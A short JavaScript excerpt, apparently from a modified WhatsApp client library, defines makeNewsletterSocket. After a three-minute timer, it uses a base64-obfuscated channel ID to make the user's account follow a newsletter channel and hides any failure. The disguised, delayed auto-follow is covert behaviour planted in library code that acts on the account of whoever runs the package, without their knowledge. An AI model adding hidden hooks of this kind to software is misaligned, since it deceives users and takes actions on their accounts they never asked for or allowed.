...
export const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
    try {
        await newsletterWMexQuery(Buffer.from("MDAyOVZiODYzclNMdE9qRHJETkhxcTNvQG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        console.log('✅ Channel di-follow')
    } catch (e) {
        console.log('⚠️ Skip auto-follow:', e.message)
    }
}, 180000)
